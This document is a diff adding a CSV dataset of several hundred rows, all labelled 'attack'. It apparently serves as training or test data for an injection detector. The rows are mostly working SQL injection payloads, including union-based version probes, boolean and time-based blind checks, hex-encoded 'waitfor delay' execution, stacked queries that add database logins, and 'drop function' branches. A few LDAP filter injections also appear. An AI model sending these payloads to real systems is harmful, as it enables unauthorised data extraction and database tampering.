@@ -1,0 +1,370 @@
+label,payload,family
+attack,s,other
+attack,truncate,other
+attack,"insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   ",other
+attack,"exec sp_addlogin 'name' , 'password'",other
+attack,0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,other
+attack,delete,other
+attack,declare @s varchar  (  200  )   select @s   =   0x77616974 ...,other
+attack,exec  (  @s  ) ,other
+attack,update,other
+attack,or   (  EXISTS  ) ,other
+attack," union   (  select NULL,   (  select @@version   )    )    --",other
+attack," union   (  select NULL, NULL,   (  select @@version   )    )    --",other
+attack,"admin""/*",other
+attack," union   (  select NULL, NULL, NULL, NULL,  NULL,   (  select @@version   )    )    --",other
+attack,declare @q nvarchar   (  200  )   0x730065006c00650063 ...,other
+attack," union   (  select NULL, NULL, NULL, NULL,    (  select @@version   )    )    --",other
+attack,desc,other
+attack,0x770061006900740066006F0072002000640065006C00 ...,other
+attack, or ''-',other
+attack, ( ,other
+attack,0x730065006c0065006300740020004000400076006500 ...,other
+attack,%2A%28%7C%28mail%3D%2A%29%29,other
+attack,declare @s varchar  (  200  )   select @s   =   0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,other
+attack,"""&""",other
+attack,",@variable",other
+attack,%2A%7C,other
+attack,*  (  |  (  mail  =  *   )    ) ,other
+attack,"<>""'%;  )    (  &+",other
+attack,0x730065006c00650063007400200040004000760065007200730069006f006e00 exec  (  @q  ) ,other
+attack,admin' --,other
+attack,"""*""",other
+attack,*  (  |  (  objectclass  =  *   )    ) ,other
+attack,*|,other
+attack,# from wapiti,other
+attack,1'  )   as oknw where 8777  =  8777,other
+attack,"iif  (  7889  =  5114,1,1/0  )  ",other
+attack,select   (  case when   (  2161  =  4328  )   then 2161 else 2161*  (  select 2161 from mysql.db  )   end  )  #,other
+attack,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3-- ampw",other
+attack,select   (  case when   (  3855  =  3855  )   then 3855 else 1/  (  select 0  )   end  )  --,other
+attack,1'||  (  select 'uiyj' from dual where 8320  =  8320,other
+attack,"1""   )    )    as osuh where 8809  =  8809",other
+attack,1  )   as lisg where 5490  =  5490,other
+attack,"1""   )    )    as bbkl where 5686  =  5686",other
+attack,1'   )    )    as pgif where 6346  =  6346,other
+attack,select   (  case when   (  2774  =  5503  )   then 2774 else 2774*  (  select 2774 from information_schema.character_sets  )   end  )  #,other
+attack,"1""  )   where 2834  =  2834   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",other
+attack,select case when 6420  =  7941 then 1 else null end--,other
+attack,"1',  (  select   (  case when   (  6894  =  6087  )   then 1 else 6894*  (  select 6894 from information_schema.character_sets  )   end   )    )   ",other
+attack,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual--",other
+attack,-7199'||  (  select 'ssty' where 5406  =  5406 order by 1#,other
+attack,"1"" where 7045  =  7045",other
+attack,select case when 6229  =  2077 then 1 else null end--,other
+attack,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3-- uugg",other
+attack,-2573   )    )    order by 1#,other
+attack,1'  )   as bihs where 4197  =  4197,other
+attack,1'||  (  select 'fwph' where 3791  =  3791,other
+attack,"1  )   as qjbd where 2808  =  2808   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",other
+attack,select case when 2599  =  7035 then 1 else null end--,other
+attack,1  )   rlike   (  select   (  case when   (  8488  =  1270  )   then 1 else 0x28 end   )    ) ,other
+attack,1'+  (  select qdon where 9453  =  9453,other
+attack,1  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    ) ,other
+attack,"1""   )    )    as ljhz where 2416  =  2416",other
+attack,if  (  8537  =  7034  )   select 8537 else drop function vqmp--,other
+attack,1  )   as msat where 1267  =  1267,other
+attack,select case when 2640  =  9249 then 1 else null end--,other
+attack,1'   )    )    as ypgz where 8704  =  8704,other
+attack,1'+  (  select 'feof' where 1966  =  1966,other
+attack,"-3169"" order by 1#",other
+attack,1   )    )    as xmac where 7692  =  7692,other
+attack,select   (  case when   (  3076  =  3596  )   then 3076 else 3076*  (  select 3076 from mysql.db  )   end  )  #,other
+attack,1'+  (  select qtyi where 7147  =  7147,other
+attack,1   )    )    as quap where 7625  =  7625,other
+attack,1'   )    )    as njop where 7001  =  7001,other
+attack,"1'||  (  select 'ozki' where 4435  =  4435   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )      )    )   ||'",other
+attack,"1"" where 3764  =  3764",other
+attack,"1 where 3478  =  3478   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",other
+attack,1'  )   where 9272  =  9272,other
+attack,1'   )    )    as plgq where 1121  =  1121,other
+attack,"1""   )    )    as fjtv where 8904  =  8904",other
+attack,1',other
+attack,"1""  )   as saqy where 9704  =  9704   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",other
+attack,"1""  )   as qnmd where 5642  =  5642",other
+attack,select   (  case when   (  7019  =  1998  )   then 7019 else 7019*  (  select 7019 from mysql.db  )   end  )  #,other
+attack,"1',  (  select   (  case when   (  6948  =  4654  )   then 1 else 6948*  (  select 6948 from mysql.db  )   end   )    )   ",other
+attack,1'+  (  select 'lpkv' where 8760  =  8760,other
+attack,1   )    )    as gxvp where 3865  =  3865,other
+attack,select   (  case when   (  2394  =  4530  )   then 2394 else 2394*  (  select 2394 from information_schema.character_sets  )   end  )  #,other
+attack,1  )   as kaew where 2658  =  2658,other
+attack,select   (  case when   (  9318  =  7198  )   then 9318 else 9318*  (  select 9318 from information_schema.character_sets  )   end  )  #,other
+attack, (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  5877  =  5877  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    ) ,other
+attack,1'+  (  select 'leok' where 4320  =  4320,other
+attack,1'||  (  select 'qgnz' where 6446  =  6446,other
+attack,if  (  1087  =  5839  )   select 1087 else drop function zzeh--,other
+attack,1'+  (  select wpai where 3685  =  3685,other
+attack,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3#",other
+attack,"1',  (  select   (  case when   (  8596  =  8596  )   then 1 else 8596*  (  select 8596 from mysql.db  )   end   )    )   ",other
+attack,select case when 8227  =  1229 then 1 else null end--,other
+attack,1'   )    )    as cimd where 9608  =  9608,other
+attack,1  )   where 8375  =  8375,other
+attack,select   (  case when   (  2140  =  5325  )   then 2140 else 2140*  (  select 2140 from information_schema.character_sets  )   end  )  #,other
+attack,1'+  (  select eluw where 6210  =  6210,other
+attack,1'   )    )    as egsj where 3447  =  3447,other
+attack,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   ||'",other
+attack,1'   )    )    as iuta where 1482  =  1482,other
+attack,select   (  case when   (  5970  =  2200  )   then 1 else 5970*  (  select 5970 from master..sysdatabases  )   end  )  --,other
+attack,"iif  (  1539  =  1539,1539,1/0  )  ",other
+attack,"1""  )   as jiiq where 6847  =  6847",other
+attack,"1""  )   as zopq where 2680  =  2680",other
+attack,1  )   where 2390  =  2390,other
+attack,1'  )   where 5378  =  5378,other
+attack,"1'||  (  select 'setd' from dual where 3686  =  3686   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users   )    )   ||'",other
+attack,"select * from generate_series  (  5206,5206,case when   (  5206  =  2214  )   then 1 else 0 end  )   limit 1--",other
+attack,1'||  (  select 'hbho' from dual where 7193  =  7193,other
+attack,1  )   where 7159  =  7159,other
+attack,"1""  )  ",other
+attack,1'+  (  select 'uqaf' where 7414  =  7414,other
+attack,1   )    )    as ehlg where 6340  =  6340,other
+attack,1'+  (  select 'unpz' where 8186  =  8186,other
+attack,select   (  case when   (  9931  =  3424  )   then 1 else 9931*  (  select 9931 from master..sysdatabases  )   end  )  --,other
+attack,select   (  case when   (  7096  =  2568  )   then 7096 else 1/  (  select 0  )   end  )  --,other
+attack,1' where 8099  =  8099,other
+attack,select   (  case when   (  5163  =  4861  )   then 1 else 5163*  (  select 5163 from master..sysdatabases  )   end  )  --,other
+attack,1'+  (  select 'mquh' where 3933  =  3933,other
+attack,select case when 3252  =  9622 then 1 else null end--,other
+attack,"1""  )   where 3826  =  3826",other
+attack,"1""  )   where 9499  =  9499",other
+attack,select   (  case when   (  3344  =  8103  )   then 3344 else 1/  (  select 0  )   end  )  --,other
+attack,"select * from generate_series  (  3607,3607,case when   (  3607  =  4242  )   then 1 else 0 end  )   limit 1--",other
+attack,1   )    )    as somz where 1598  =  1598,other
+attack,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  #",other
+attack,1  )   as hhly where 2906  =  2906,other
+attack,select case when 4537  =  8418 then 1 else null end--,other
+attack,"iif  (  3447  =  1084,1,1/0  )  ",other
+attack,select   (  case when   (  7271  =  1658  )   then 7271 else 7271*  (  select 7271 from information_schema.character_sets  )   end  )  #,other
+attack,select   (  case when   (  5698  =  3453  )   then 5698 else 1/  (  select 0  )   end  )  --,other
+attack,-3125'   )    )     )   order by 1#,other
+attack,-1192 order by 1#,other
+attack,"-7831""   )    )    as krzi where 3798  =  3798 order by 1--",other
+attack,1'  )   where 3861  =  3861,other
+attack,if  (  1928  =  4811  )   select 1928 else drop function ucko--,other
+attack,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  # cdjm",other
+attack,1'+  (  select 'gtqr' where 5660  =  5660,other
+attack,-1432 order by 1#,other
+attack,"1"" where 3510  =  3510",other
+attack,1  )   as odqn where 3910  =  3910,other
+attack,select   (  case when   (  1434  =  1549  )   then 1434 else 1434*  (  select 1434 from mysql.db  )   end  )  #,other
+attack,select case when 5559  =  3483 then 1 else null end--,other
+attack,"1""  )   where 8196  =  8196",other
+attack,1'  )   where 6045  =  6045,other
+attack,"-1418""  )   where 7528  =  7528 order by 1#",other
+attack,1'+  (  select 'rajp' where 3300  =  3300,other
+attack,select   (  case when   (  2717  =  2634  )   then 2717 else 2717*  (  select 2717 from mysql.db  )   end  )  #,other
+attack,1'  )   where 2090  =  2090,other
+attack,"1""  )   where 9827  =  9827",other
+attack,"iif  (  4638  =  8258,1,1/0  )  ",other
+attack,"select * from generate_series  (  7536,7536,case when   (  7536  =  7523  )   then 1 else 0 end  )   limit 1--",other
+attack,1'||  (  select 'gmkp' where 6016  =  6016,other
+attack,"1,  (  select   (  case when   (  8640  =  8640  )   then   (  ascii  (  regexp_substring  (  repeat  (  right  (  char  (  8640  )  ,0  )  ,500000000  )  ,null   )    )     )   else 8640/  (  select 0 from information_schema.system_users  )   end  )   from information_schema.system_users  )  --",other
+attack,select   (  case when   (  2593  =  3592  )   then 2593 else 2593*  (  select 2593 from information_schema.character_sets  )   end  )  #,other
+attack,select   (  case when   (  2056  =  1917  )   then 2056 else 1/  (  select 0  )   end  )  --,other
+attack,"1  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  ",other
+attack,select case when 8867  =  7630 then 1 else null end--,other
+attack,"1"" where 9725  =  9725",other
+attack,1'  )   as nexa where 6740  =  6740,other
+attack,"1""  )   as wmng where 5976  =  5976",other
+attack, (  select   (  case when   (  3592  =  3592  )   then 3592 else 3592*  (  select 3592 from information_schema.character_sets  )   end   )    ) ,other
+attack,1'+  (  select yjyp where 9696  =  9696,other
+attack,select   (  case when   (  7645  =  5921  )   then 7645 else 7645*  (  select 7645 from information_schema.character_sets  )   end  )  #,other
+attack,"select count  (  *  )   from generate_series  (  1,5000000  )  ",other
+attack,1'||  (  select 'gnil' from dual where 7552  =  7552 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )     )  ||',other
+attack, (  select   (  case when   (  9525  =  9280  )   then 9525 else 9525*  (  select 9525 from master..sysdatabases  )   end   )    ) ,other
+attack,1' where 6168  =  6168,other
+attack,1'||  (  select 'lzzr' where 2477  =  2477,other
+attack,1'  )   as uwmy where 6980  =  6980,other
+attack,1%'   )    )     ) ,other
+attack,"iif  (  2084  =  5671,1,1/0  )  ",other
+attack,1'   )    ) ,other
+attack,1'+  (  select 'fqkk' where 9725  =  9725,other
+attack,1'||  (  select 'mobv' from dual where 6338  =  6338,other
+attack,"-2964""   )    )    order by 1--",other
+attack,select   (  case when   (  1898  =  4705  )   then 1898 else 1/  (  select 0  )   end  )  --,other
+attack,1   )    )    as zldh where 3302  =  3302 rlike   (  select   (  case when   (  1481  =  5677  )   then 1 else 0x28 end   )    )   --,other
+attack,-5500'  )   order by 1--,other
+attack,select   (  case when   (  9246  =  6326  )   then 9246 else 9246*  (  select 9246 from mysql.db  )   end  )  #,other
+attack,select   (  case when   (  3499  =  4209  )   then 3499 else 3499*  (  select 3499 from mysql.db  )   end  )  #,other
+attack,select   (  case when   (  1776  =  7688  )   then 1776 else 1/  (  select 0  )   end  )  --,other
+attack,1 where 7802  =  7802,other
+attack,1'   )    )    as rxxd where 5049  =  5049,other
+attack,1   )    )    as rhwg where 8843  =  8843,other
+attack,"iif  (  1378  =  6569,1,1/0  )  ",other
+attack,1 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   -- jduw,other
+attack,1'||  (  select 'allj' where 7334  =  7334,other
+attack,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual# gnga",other
+attack,select   (  case when   (  4341  =  7041  )   then 4341 else 4341*  (  select 4341 from mysql.db  )   end  )  #,other
+attack,"1""  )   where 2278  =  2278",other
+attack,1'||  (  select 'adni' from dual where 6611  =  6611,other
+attack,1'  )   where 3893  =  3893,other
+attack,"1""  )   as semi where 4260  =  4260",other
+attack,1'  )   where 1183  =  1183,other
+attack,1' where 4945  =  4945,other
+attack,"1"" where 1982  =  1982",other
+attack,-9014' order by 1--,other
+attack,end,other
+attack,1'  )   where 8163  =  8163,other
+attack,1  )   as iqkf where 7780  =  7780,other
+attack,"1  )   as tkkn where 7832  =  7832   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",other
+attack,if  (  6647  =  2179  )   select 6647 else drop function zvlq--,other
+attack,1'+  (  select 'ezpy' where 5282  =  5282 order by 1#,other
+attack,select   (  case when   (  4780  =  4432  )   then 4780 else 4780*  (  select 4780 from mysql.db  )   end  )  #,other
+attack,1 where 1576  =  1576,other
+attack,1  )   as fhvr where 5544  =  5544,other
+attack,"1,  (  select   (  case when   (  8596  =  8596  )   then 1 else 8596*  (  select 8596 from mysql.db  )   end   )    )   ",other
+attack,"1""  )   where 2445  =  2445",other
+attack,1'||  (  select 'ifts' from dual where 6329  =  6329,other
+attack,"select * from generate_series  (  3180,3180,case when   (  3180  =  4445  )   then 1 else 0 end  )   limit 1--",other
+attack,"1""   )    )    as aamh where 7432  =  7432   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",other
+attack,select   (  case when   (  9388  =  4322  )   then 1 else 9388*  (  select 9388 from master..sysdatabases  )   end  )  --,other
+attack,1'+  (  select 'upmd' where 3438  =  3438,other
+attack,1  )   where 6090  =  6090,other
+attack,select   (  case when   (  8642  =  6049  )   then 1 else 8642*  (  select 8642 from master..sysdatabases  )   end  )  --,other
+attack,1' where 1844  =  1844,other
+attack,1'+  (  select xzvf where 9727  =  9727,other
+attack,1'||  (  select 'bzxa' where 6320  =  6320,other
+attack,1' where 1770  =  1770,other
+attack,1 where 1519  =  1519,other
+attack,1'+  (  select hvsb where 3666  =  3666,other
+attack,"1"" order by 1--",other
+attack,"1,  (  select * from generate_series  (  9108,9108,case when   (  9108  =  2900  )   then 1 else 0 end  )   limit 1  )  ",other
+attack,1'||  (  select 'xugb' from dual where 6772  =  6772,other
+attack,"1"" where 7015  =  7015",other
+attack,1'||  (  select 'zwcp' where 3333  =  3333,other
+attack,select case when 2095  =  9074 then 1 else null end--,other
+attack,"1"" where 7828  =  7828",other
+attack,1'||  (  select 'lljg' from dual where 7631  =  7631,other
+attack,1  )   where 2083  =  2083,other
+attack,"1'   )    )    as ijyi where 3694  =  3694   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",other
+attack,"select * from generate_series  (  6200,6200,case when   (  6200  =  5449  )   then 1 else 0 end  )   limit 1--",other
+attack,select   (  case when   (  7169  =  7785  )   then 1 else 7169*  (  select 7169 from master..sysdatabases  )   end  )  --,other
+attack,if  (  4194  =  4133  )   select 4194 else drop function tqhz--,other
+attack,select   (  case when   (  4393  =  2875  )   then 1 else 4393*  (  select 4393 from master..sysdatabases  )   end  )  --,other
+attack,1'+  (  select byor where 4538  =  4538,other
+attack,select   (  case when   (  8113  =  8981  )   then 8113 else 1/  (  select 0  )   end  )  --,other
+attack,end# thjv,other
+attack,1  )   as ywrn where 1893  =  1893,other
+attack,"1""   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  ",other
+attack,"-9152""   )    )    as avga where 3825  =  3825 order by 1#",other
+attack,"1""  )   where 8390  =  8390",other
+attack,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  ",other
+attack,1  )   as selm where 5759  =  5759,other
+attack,1'  )   as cdrm where 4595  =  4595 order by 1#,other
+attack,"1,  (  select   (  case when   (  3717  =  3717  )   then 1 else 3717*  (  select 3717 from master..sysdatabases  )   end   )    )   ",other
+attack,"1""  )   as dlfq where 8410  =  8410",other
+attack,1'   )    )    as xirr where 2425  =  2425,other
+attack,select case when 7717  =  7717 then 1 else null end--,other
+attack,"1""  )   where 9248  =  9248",other
+attack,"1""  )   where 9855  =  9855",other
+attack,end--,other
+attack,"1,  (  select   (  case when   (  3902  =  3902  )   then   (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   else 1/  (  select 0 from dual  )   end  )   from dual  )  ",other
+attack,1'||  (  select 'aevx' from dual where 9999  =  9999,other
+attack,1'+  (  select snam where 1993  =  1993,other
+attack,1%' order by 1--,other
+attack,if  (  2823  =  3532  )   select 2823 else drop function kmqw--,other
+attack,1' where 2690  =  2690,other
+attack,"1""  )   where 5358  =  5358",other
+attack,1'  )   where 5616  =  5616,other
+attack,"select * from generate_series  (  9058,9058,case when   (  9058  =  1183  )   then 1 else 0 end  )   limit 1--",other
+attack,1'   )    )    as qpai where 2619  =  2619,other
+attack,"iif  (  6307  =  2459,1,1/0  )  ",other
+attack,-6566'  )   as kggb where 9768  =  9768 order by 1--,other
+attack,"1'  )   where 3579  =  3579   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",other
+attack,"1"" order by 1#",other
+attack,1'+  (  select basp where 6953  =  6953,other
+attack,1'  )   where 2808  =  2808,other
+attack,-3750'+  (  select alpu where 3911  =  3911 order by 1--,other
+attack,1'   )    )    as clbc where 5649  =  5649,other
+attack,"1""   )    )    as nhus where 3689  =  3689",other
+attack,1  )   where 1333  =  1333 order by 1--,other
+attack,1'||  (  select 'hkvl' from dual where 8882  =  8882,other
+attack,select   (  case when   (  7594  =  8086  )   then 7594 else 1/  (  select 0  )   end  )  --,other
+attack,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ||'",other
+attack,1'  )   as wjty where 2971  =  2971,other
+attack,1' where 7613  =  7613,other
+attack,1 where 7254  =  7254,other
+attack,1 where 7464  =  7464 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,other
+attack,"-8797""   )    )    order by 1#",other
+attack,select   (  case when   (  8208  =  7960  )   then 8208 else 8208*  (  select 8208 from information_schema.character_sets  )   end  )  #,other
+attack,"1  )   where 5550  =  5550   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",other
+attack,1'+  (  select 'hrxp' where 5948  =  5948,other
+attack,"1%""   )    )    order by 1--",other
+attack,1'  )   as rvli where 4427  =  4427,other
+attack,1  )   where 4780  =  4780,other
+attack,"1""  )   where 1807  =  1807",other
+attack,"1""  )   as piwi where 2918  =  2918",other
+attack,1   )    )    as efjb where 4642  =  4642 order by 1#,other
+attack,1'  )   where 2840  =  2840,other
+attack,1'||  (  select 'lkmh' where 7659  =  7659,other
+attack,-3304'   )    )    order by 1--,other
+attack,"1""   )    )    as qgwq where 6122  =  6122",other
+attack,select case when 8237  =  9948 then 1 else null end--,other
+attack,"1' in boolean mode  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  #",other
+attack,"1"" where 9829  =  9829 order by 1#",other
+attack,select   (  case when   (  5418  =  6516  )   then 1 else 5418*  (  select 5418 from master..sysdatabases  )   end  )  --,other
+attack,1'  )   where 7903  =  7903,other
+attack,1   )    )    as rroe where 4840  =  4840,other
+attack,if  (  8182  =  3225  )   select 8182 else drop function kpzk--,other
+attack,1'||  (  select 'bezt' where 7876  =  7876,other
+attack,1'  )   as qqyz where 2274  =  2274,other
+attack,-4325 order by 1--,other
+attack,1'  )   rlike   (  select   (  case when   (  7447  =  3981  )   then 1 else 0x28 end   )    ) ,other
+attack,if  (  6767  =  5022  )   select 6767 else drop function buii--,other
+attack,1   )    )    as pxmz where 2596  =  2596,other
+attack,"1',  (  select   (  case when   (  5586  =  6403  )   then 1 else 5586*  (  select 5586 from mysql.db  )   end   )    )   ",other
+attack,1'||  (  select 'abjv' from dual where 4200  =  4200,other
+attack,1'  )   where 8128  =  8128,other
+attack,1  )   as ktfu where 2637  =  2637,other
+attack,"1""   )    )    as upvg where 4826  =  4826",other
+attack,1'  )   as wtev where 5283  =  5283,other
+attack,1'+  (  select 'ozpm' where 6939  =  6939 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )     )  +',other
+attack,1  )   as iiku where 9466  =  9466,other
+attack,"-9737""   )    )     )   order by 1--",other
+attack,1'||  (  select 'ubza' where 2576  =  2576,other
+attack, (  select   (  case when   (  1570  =  6977  )   then 1 else 1570*  (  select 1570 from mysql.db  )   end   )    ) ,other
+attack,1'+  (  select 'wyed' where 9896  =  9896,other
+attack,1'   )    )    as myws where 5274  =  5274,other
+attack,-7246'||  (  select 'qchp' from dual where 8317  =  8317 order by 1--,other
+attack,"select * from generate_series  (  2382,2382,case when   (  2382  =  4352  )   then 1 else 0 end  )   limit 1--",other
+attack,1   )    )    as nwyh where 7100  =  7100,other
+attack,"1""   )    )    as dvpb where 6673  =  6673",other
+attack,1  )   where 6304  =  6304,other
+attack,1'   )    )    as tlsl where 8467  =  8467,other
+attack,"1""""  (  .'.  (  ,  (  .",other
+attack,"1""   )    )    as wssb where 5772  =  5772",other
+attack,1'||  (  select 'ldad' where 6146  =  6146 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )     )  ||',other
+attack,1 where 8135  =  8135,other
+attack,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )  --",other
+attack,"1""   )    )    as fmul where 7827  =  7827",other
+attack,"select * from generate_series  (  6414,6414,case when   (  6414  =  6455  )   then 1 else 0 end  )   limit 1--",other
+attack,"1""  )   where 2070  =  2070",other
+attack,1'  )   as gdie where 8133  =  8133 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,other
+attack,1'||  (  select 'lnhq' where 7526  =  7526,other
+attack,"iif  (  1483  =  7301,1,1/0  )  ",other
+attack,1'||  (  select 'dyuw' from dual where 2037  =  2037,other
+attack, (  select   (  case when   (  1421  =  1421  )   then 1 else 1421*  (  select 1421 from master..sysdatabases  )   end   )    ) ,other
+attack,select   (  case when   (  6287  =  8341  )   then 6287 else 1/  (  select 0  )   end  )  --,other
+attack,"select * from generate_series  (  2673,2673,case when   (  2673  =  1468  )   then 1 else 0 end  )   limit 1--",other
+attack,1 where 7055  =  7055,other
+attack,1' where 2661  =  2661,other
+attack,1  )   as mpnj where 5049  =  5049,other
+attack,"-9031%""  )   order by 1--",other
+attack,"iif  (  1305  =  5656,1,1/0  )  ",other
+attack,1'||  (  select 'bhxx' where 2585  =  2585,other
+attack,"1"" where 9919  =  9919",other
+attack,1'  )   as kqbh where 6138  =  6138,other
+attack,"1"" where 4319  =  4319",other
+attack,select   (  case when   (  6859  =  6507  )   then 6859 else 6859*  (  select 6859 from mysql.db  )   end  )  #,other
+attack,1'||  (  select 'mnvk' from dual where 4181  =  4181,other
+attack,-3597'   )    )    order by 1--,other
+attack,1'   )    )    as joco where 2922  =  2922,other
+attack,1  )   where 2223  =  2223,other
+attack,1' where 9416  =  9416,other
+attack,1  )   where 9683  =  9683,other
+attack,"1""  )   where 8153  =  8153",other
+attack,1'1,other
+attack,admin' or ',other
+attack,UE1,other
+attack,v,other
+attack,{s,other
+attack,-',other
+attack,&,other
